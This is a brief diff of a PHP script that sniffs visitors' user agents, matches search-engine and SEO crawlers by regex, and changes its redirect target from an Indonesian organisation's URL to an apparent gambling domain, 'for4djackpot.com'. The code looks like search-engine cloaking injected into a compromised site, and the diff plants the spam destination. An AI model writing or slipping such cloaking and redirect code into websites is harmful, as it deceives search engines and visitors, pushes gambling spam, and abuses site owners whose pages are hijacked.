@@ -5,7 +5,7 @@ header('Vary: User-Agent');
 
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
 
-$urlTo = "https://idebahasa.or.id/escience/";
+$urlTo = "https://for4djackpot.com/";
 
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefs)/";
 
